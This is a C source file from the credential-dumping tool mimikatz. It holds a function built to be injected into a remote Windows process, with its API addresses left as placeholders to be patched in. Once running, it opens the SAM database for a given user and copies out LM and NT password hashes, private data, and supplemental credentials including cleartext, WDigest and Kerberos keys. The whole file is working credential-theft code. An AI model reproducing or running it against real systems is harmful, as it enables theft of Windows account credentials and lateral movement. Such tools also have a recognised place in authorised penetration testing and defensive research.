/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump_remote.h"

#pragma optimize("", off)
DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
{
	SAMPR_HANDLE hSam, hDomain, hUser;
	DWORD i, credSize = 0;
	PSAMPR_USER_INFO_BUFFER info = NULL;
	LSA_SUPCREDENTIALS_BUFFERS buffers[6];

	DWORD kn[][10] = {
		{0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054}, // CLEARTEXT
		{0x00440057, 0x00670069, 0x00730065, 0x00000074}, // WDigest
		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x00000000}, // Kerberos
		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065, 0x00000073}, // Kerberos-Newer-Keys
		{0x0054004e, 0x004d004c, 0x0053002d, 0x00720074, 0x006e006f, 0x002d0067, 0x0054004e, 0x0057004f, 0x00000046}, // NTLM-Strong-NTOWF
	};
	UNICODE_STRING knu[] = {
		{18, 18, (PWSTR) kn[0]},
		{14, 14, (PWSTR) kn[1]},
		{16, 16, (PWSTR) kn[2]},
		{38, 38, (PWSTR) kn[3]},
		{34, 34, (PWSTR) kn[4]},
	};

	if(NT_SUCCESS(((PSAMICONNECT) 0x4141414141414141)(NULL, &hSam, 0x10000000, TRUE)))
	{
		if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, lpParameter->input.inputData/* pPolicyDomainInfo->DomainSid*/, &hDomain)))
		{
			if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, lpParameter->input.inputDword, &hUser)))
			{
				for(i = 0; i < 6; i++)
				{
					buffers[i].Buffer = NULL;
					buffers[i].credential.size = 0;
					buffers[i].credential.type = i;
					buffers[i].status = STATUS_ABANDONED;

					if(i)
						buffers[i].status = ((PSAMIRETRIEVEPRIMARYCREDENTIALS) 0x4343434343434343)(hUser, &knu[i-1], &buffers[i].Buffer, &buffers[i].credential.size);
					else
					{
						buffers[i].status = ((PSAMRQUERYINFORMATIONUSER) 0x4646464646464646)(hUser, UserAllInformation, &info);
						if(NT_SUCCESS(buffers[i].status))
						{
							buffers[i].credential.size = FIELD_OFFSET(KIWI_SAMPR_USER_INTERNAL42_INFORMATION, Private) + (info->All.PrivateDataSensitive ? info->All.PrivateData.Length : 0);
							if(buffers[i].Buffer = ((PLOCALALLOC) 0x4d4d4d4d4d4d4d4d)(LPTR, buffers[i].credential.size))
							{
								if(info->All.LmPasswordPresent && (info->All.LmOwfPassword.Length == LM_NTLM_HASH_LENGTH) && info->All.LmOwfPassword.Buffer)
								{
									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.LmPasswordPresent = TRUE;
									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.LMHash, info->All.LmOwfPassword.Buffer, LM_NTLM_HASH_LENGTH);
								}
								if(info->All.NtPasswordPresent && (info->All.NtOwfPassword.Length == LM_NTLM_HASH_LENGTH) && info->All.NtOwfPassword.Buffer)
								{
									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.NtPasswordPresent = TRUE;
									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.NTHash, info->All.NtOwfPassword.Buffer, LM_NTLM_HASH_LENGTH);
								}
								if(info->All.PrivateDataSensitive && info->All.PrivateData.Length && info->All.PrivateData.Buffer)
								{
									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.PrivateDataSensitive = TRUE;
									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->cbPrivate = info->All.PrivateData.Length;
									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Private, info->All.PrivateData.Buffer, info->All.PrivateData.Length);
								}
							}
							((PSAMIFREE_SAMPR_USER_INFO_BUFFER) 0x4747474747474747)(info, UserAllInformation);
						}
					}
					if(NT_SUCCESS(buffers[i].status) && buffers[i].Buffer && buffers[i].credential.size)
						credSize += buffers[i].credential.size;
				}

				lpParameter->output.outputSize = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
				if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
				{
					credSize = 0;
					((PLSA_SUPCREDENTIALS) lpParameter->output.outputData)->count = 6;
					for(i = 0; i < 6; i++)
					{
						if(NT_SUCCESS(buffers[i].status))
						{
							if(buffers[i].Buffer && buffers[i].credential.size)
							{
								buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
								((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->output.outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
								((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->output.outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
								credSize += buffers[i].credential.size;
							}
							((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(buffers[i].Buffer);
						}
					}
				}
				((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hUser);
			}
			((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hDomain);
		}
		((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hSam);
	}
	return STATUS_SUCCESS;
}
DWORD kuhl_sekurlsa_samsrv_thread_end(){return 'lsar';}
#pragma optimize("", on)